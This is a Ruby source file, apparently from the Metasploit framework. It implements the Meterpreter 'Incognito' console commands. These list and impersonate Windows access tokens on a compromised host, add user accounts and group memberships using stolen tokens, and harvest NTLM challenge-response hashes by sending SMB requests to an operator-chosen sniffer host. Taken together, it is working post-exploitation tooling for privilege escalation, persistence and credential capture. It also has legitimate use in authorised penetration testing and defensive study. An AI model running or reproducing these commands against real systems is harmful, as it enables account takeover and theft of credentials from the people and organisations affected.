# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Privilege escalation extension user interface.
#
###
class Console::CommandDispatcher::Incognito

  Klass = Console::CommandDispatcher::Incognito

  include Console::CommandDispatcher

  #
  # Initializes an instance of the priv command interaction.
  #
  def initialize(shell)
    super
  end

  #
  # List of supported commands.
  #
  def commands
    {
      "add_user" => "Attempt to add a user with all tokens",
      "add_localgroup_user" => "Attempt to add a user to a local group with all tokens",
      "add_group_user" => "Attempt to add a user to a global group with all tokens",
      "list_tokens" => "List tokens available under current user context",
      "impersonate_token" => "Impersonate specified token",
      "snarf_hashes" => "Snarf challenge/response hashes for every token"
    }
  end


  @@add_user_opts = Rex::Parser::Arguments.new(
    "-h" => [ true,  "Add user to remote host" ])

  @@add_localgroup_user_opts = Rex::Parser::Arguments.new(
    "-h" => [ true,  "Add user to local group on remote host" ])

  @@add_group_user_opts = Rex::Parser::Arguments.new(
    "-h" => [ true,  "Add user to global group on remote host" ])

  @@list_tokens_opts = Rex::Parser::Arguments.new(
    "-u" => [ false,  "List tokens by unique username" ],
    "-g" => [ false, "List tokens by unique groupname" ])

  def cmd_list_tokens(*args)
    token_order = -1

    @@list_tokens_opts.parse(args) { |opt, idx, val|
      case opt
        when "-u"
          token_order = 0
        when "-g"
          token_order = 1
      end
    }

    if (token_order == -1)
      print_line("Usage: list_tokens <list_order_option>\n")
      print_line("Lists all accessible tokens and their privilege level")
      print_line(@@list_tokens_opts.usage)
      return
    end

    system_privilege_check

    tokens = client.incognito.incognito_list_tokens(token_order)

    print_line()
    print_line("Delegation Tokens Available")
    print_line("========================================")

    tokens['delegation'].each_line { |string|
      print(string)
    }

    print_line()
    print_line("Impersonation Tokens Available")
    print_line("========================================")

    tokens['impersonation'].each_line { |string|
      print(string)
    }

    print_line()

    return true
  end

  def cmd_impersonate_token(*args)
    if (args.length < 1)
      print_line("Usage: impersonate_token <token>\n")
      print_line("Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.\n")
      print_line("Hint: Double backslash DOMAIN\\\\name (meterpreter quirk)")
      print_line("Hint: Enclose with quotation marks if name contains a space\n")
      return
    end

    system_privilege_check
    username = args[0]
    client.incognito.incognito_impersonate_token(username).each_line { |string|
      print(string)
    }

    return true
  end

  def cmd_add_user(*args)
    # Default to localhost
    host = "127.0.0.1"

    @@add_user_opts.parse(args) { |opt, idx, val|
      case opt
        when "-h"
          host = val
      end
    }

    if (args.length < 2)
      print_line("Usage: add_user <username> <password> [options]\n")
      print_line("Attempts to add a user to a host with all accessible tokens. Terminates when successful, an error that is not access denied occurs (e.g. password does not meet complexity requirements) or when all tokens are exhausted")
      print_line(@@add_user_opts.usage)
      return
    end

    system_privilege_check

    username = args[0]
    password = args[1]

    client.incognito.incognito_add_user(host, username, password).each_line { |string|
      print(string)
    }

    return true
  end

  def cmd_add_localgroup_user(*args)
    # Default to localhost
    host = "127.0.0.1"

    @@add_localgroup_user_opts.parse(args) { |opt, idx, val|
      case opt
        when "-h"
          host = val
      end
    }

    if (args.length < 2)
      print_line("Usage: add_localgroup_user <groupname> <username> [options]\n")
      print_line("Attempts to add a user to a local group on a host with all accessible tokens. Terminates when successful, an error that is not access denied occurs (e.g. user not found) or when all tokens are exhausted")
      print_line(@@add_localgroup_user_opts.usage)
      return
    end

    system_privilege_check

    groupname = args[0]
    username = args[1]

    client.incognito.incognito_add_localgroup_user(host, groupname, username).each_line { |string|
      print(string)
    }

    return true
  end

  def cmd_add_group_user(*args)
    # Default to localhost
    host = "127.0.0.1"

    @@add_group_user_opts.parse(args) { |opt, idx, val|
      case opt
        when "-h"
          host = val
      end
    }

    if (args.length < 2)
      print_line("Usage: add_group_user <groupname> <username> [options]\n")
      print_line("Attempts to add a user to a global group on a host with all accessible tokens. Terminates when successful, an error that is not access denied occurs (e.g. user not found) or when all tokens are exhausted")
      print_line(@@add_group_user_opts.usage)
      return
    end

    system_privilege_check

    groupname = args[0]
    username = args[1]

    client.incognito.incognito_add_group_user(host, groupname, username).each_line { |string|
      print(string)
    }

    return true
  end

  def cmd_snarf_hashes(*args)
    if (args.length < 1)
      print_line("Usage: snarf_hashes <sniffer_host>\n")
      print_line("Captures LANMAN/NTLM challenge response hashes by making SMB requests to the supplied sniffing host with every accessible token.\n")
      return
    end

    system_privilege_check

    print_line("[*] Snarfing token hashes...")
    client.incognito.incognito_snarf_hashes(args[0])
    print_line("[*] Done. Check sniffer logs")

    return true
  end

  def system_privilege_check
    if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
      print_line("[-] Warning: Not currently running as SYSTEM, not all tokens will be available")
      print_line("             Call rev2self if primary process token is SYSTEM")
    end
  end

  #
  # Name for this dispatcher
  #
  def name
    "Incognito"
  end

end

end
end
end
end
